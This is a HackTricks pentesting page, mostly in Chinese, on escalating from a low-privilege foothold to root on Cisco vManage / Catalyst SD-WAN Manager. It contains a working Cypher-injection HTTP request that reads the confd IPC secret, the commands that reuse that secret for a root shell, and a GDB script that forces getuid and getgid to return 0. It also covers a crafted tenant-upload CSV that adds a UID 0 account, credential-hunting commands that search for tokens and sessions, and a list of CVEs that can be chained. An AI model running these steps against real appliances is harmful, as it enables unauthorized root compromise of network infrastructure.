# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

一旦你在 Cisco vManage / *Catalyst SD-WAN Manager* 上以 `vmanage`、`netadmin` 或 `vmanage-admin` 获得代码执行，最有意思的本地 privesc 面通常是 `confd` CLI stack、`cmdptywrapper` helper、localhost REST APIs，以及 root-owned 的 import/upload handlers。

如果你还需要在 controller 上获得**initial foothold**，先查看专门的 control-plane 页面：

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
如果从你的 foothold 可以读取 `/etc/confd/confd_ipc_secret`，那么 Path 1 和 Path 2 会立即变得可行。如果你是通过 remote info leak 或 webshell 到达这里，也要检查你是否已经能够访问 `vmanage-admin` SSH material 或 multitenancy upload handlers：2026 研究表明这两者都是现实可行的 stepping stones。

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

在翻阅了一些与 `confd` 以及不同 binaries 相关的 [documentation](http://66.218.245.39/doc/html/rn03re18.html) 后（可通过 Cisco 网站上的 account 访问），我们发现为了对 IPC socket 进行认证，它使用了一个位于 `/etc/confd/confd_ipc_secret` 的 secret：
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
还记得我们的 Neo4j 实例吗？它是在 `vmanage` 用户的权限下运行的，因此允许我们使用前面的漏洞检索该文件：
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 程序不支持命令行参数，但它会带参数调用 `/usr/bin/confd_cli_user`。因此，我们可以直接用自己的一组参数调用 `/usr/bin/confd_cli_user`。不过在当前权限下它是不可读的，所以我们必须从 rootfs 中把它取出来并用 scp 复制，查看 help，然后用它来获取 shell：
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv 团队的 blog¹ 描述了一种优雅地获取 root shell 的方法，但 caveat 是它需要拿到 `/usr/bin/confd_cli_user` 的副本，而这个文件只有 root 可读。我发现了另一种在不那么麻烦的情况下提权到 root 的方法。

当我反汇编 `/usr/bin/confd_cli` binary 时，我观察到以下内容：

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

当我运行 “ps aux” 时，我观察到了以下内容（_note -g 100 -u 107_）
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
我假设 “confd_cli” 程序会将它从已登录用户那里收集到的 user ID 和 group ID 传递给 “cmdptywrapper” 应用程序。

我的第一次尝试是直接运行 “cmdptywrapper”，并给它提供 `-g 0 -u 0`，但失败了。看起来在这个过程中某处创建了一个 file descriptor (-i 1015)，而我无法伪造它。

正如 synacktiv 的 blog（最后一个 example）中提到的那样，“confd_cli” 程序不支持 command line argument，但我可以用 debugger 来影响它，而且系统里正好包含 GDB。

我创建了一个 GDB script，在其中强制 API `getuid` 和 `getgid` 返回 0。由于我已经通过 deserialization RCE 获得了 “vmanage” privilege，所以我有权限直接读取 `/etc/confd/confd_ipc_secret`。

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>控制台输出</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## 路径 3（2025 CLI 输入验证 bug - CVE-2025-20122）

Cisco 后来在其关于 [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) 的公告中记录了一个更干净的本地 root 路径：一个**只有只读权限的已认证攻击者**可以向 manager CLI 发送精心构造的请求，并由于输入验证不足而跳到 root。

从 offensive 角度看，这里最重要的 takeaway 是：

1. 一旦你在机器上拥有*任何*低权限 foothold，就应该先测试本地 CLI service，再去做更重的 Path 1 / Path 2 workflow。
2. 复用 Path 2 的 artifacts 来找到 trust boundary：`confd_cli` → `cmdptywrapper` → `vshell`。
3. 将转发到 CLI backend 的每个字段都视为可疑：UID/GID、username、terminal metadata、imported files，或之后被 root-owned helper 消费的任何值。
4. 如果一个低权限用户可以访问本地 CLI socket 并影响这些字段，那么 root 可能只差一个精心构造的请求。

在 appliance 上落地后，一个实用的 workflow 是：
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
这把 2025 漏洞变成了一个适用于类似版本的良好 hunting 模式：寻找 **在 userland 中收集身份并将其转发给更高权限 wrapper 的本地 CLI shim**。

不要把 **CVE-2025-20122** 和后面的 **CVE-2026-20122** 混淆：2025 这个问题是一个 *本地* CLI-to-root 漏洞，而 2026 这个问题是一个 *远程* API 任意文件覆盖，主要用于植入 foothold，然后再回到 Path 1 / Path 2 / Path 4。

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco 在 2026 年 2 月的 advisory 还引入了另一类有用的 privesc： [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) 允许一个 **经过身份验证、低权限的本地攻击者** 获取 root，因为 REST API 中的用户认证机制不足。

这很重要，因为 vManage 的 privesc 不再只局限于 `confd`/TTY abuse。拿到低权限 shell 后，还要继续寻找：

- 只允许 localhost 的 API endpoints，但过度信任调用方
- 当前账号可读的 tokens、cookies 或 service credentials
- 通过 `dataservice`/REST handlers 暴露出来的 root-only 操作，但仍然可以从本地触发

实际中，一旦你拿到 `vmanage` 或其他 service user 的 shell，本地 API abuse 往往比交互式 CLI abuse 更安静，也更容易自动化：
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
如果本地 session context 足以触发特权 REST 功能，那么优先使用 API path：它更容易 replay、script，并与被盗的 web sessions 或 API tokens chain。

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

另一个近期模式是 [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)：一个具有 `netadmin` 权限的本地攻击者可以上传一个 **crafted file**，之后 CLI 会以不安全方式处理它，导致以 `root` 身份 command injection。

从 HackTricks 的角度看，这个有价值的 technique 比具体的 CVE 更广泛：

1. 枚举所有接受文件的 CLI 或 web workflow：imports、diagnostic bundles、templates、validators、backups、tenant data 等。
2. 追踪上传的文件落到哪里，以及哪个 root-owned script 或 binary 会消费它。
3. 测试 filename、file content 或解析后的 metadata 是否曾被传递给 shell commands、wrapper scripts，或 `system()` 风格的 helpers。
4. 如果你已经能拿到 `netadmin`（有效凭证、被盗 session，或一个 auth-bypass chain），那么 file-processing bugs 往往是最快到 root 的路径。

Google Cloud / Mandiant 后来展示了这个 bug class 的一个非常具体的实例：通过 multitenancy import path 被利用：
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
在观察到的攻击中，精心构造的 CSV 最终修改了 `/etc/passwd` 和 `/etc/shadow`，从而创建了一个临时的 UID 0 账号（`troot`）。这让 `tenant-upload` / `tenant-list` 这类导入器尤其值得关注：它们不只是 data-ingestion 功能，而是可能由 root 拥有的 parser front-end。

一个快速的 shell 侧 hunting pattern 是：
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
这个 bug class 尤其适合和能拿到 `netadmin` 但拿不到 `root` 的 remote footholds 串联使用。

## 其他近期可与 vManage/Catalyst SD-WAN Manager vuln 串联的 vulns

- **Unauthenticated info leak (CVE-2026-20133)** – 特别有价值，因为 public research 显示它可能暴露 `confd_ipc_secret` 或 `vmanage-admin` private key，把一个 read bug 变成 Path 1 或一个 NETCONF pivot。
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – 和上面的 2025 CLI bug 不同；VulnCheck 用它上传了一个 webshell，这样本页上的 local privesc paths 就会立刻变得相关。
- **Authenticated UI XSS (CVE-2024-20475)** – 在 web UI 里窃取 admin session，然后 pivot 到最终能到达 `vshell` 或上面某个 local privesc path 的 API/CLI actions。
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 对 Path 5 来说是非常强的前置条件，因为 `netadmin` 正是 2026 crafted-file privesc 所需的权限级别。
- **Authenticated arbitrary file write (CVE-2026-20262)** – 攻击价值与 CVE-2026-20122 类似，但通过更后面的 web UI upload path：把内容写到之后会被 root 或 management-plane web tier 解析的位置。
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 intrusion 显示攻击者可以回滚到更旧的 vulnerable SD-WAN build，利用旧的 CLI root bug，然后再恢复原始版本。
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 在专门的 SD-WAN control-plane 页面里有更详细说明；它可以为 `vmanage-admin` 追加一个 SSH key，从而给你所需的 local foothold 以便回到本页继续利用。



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
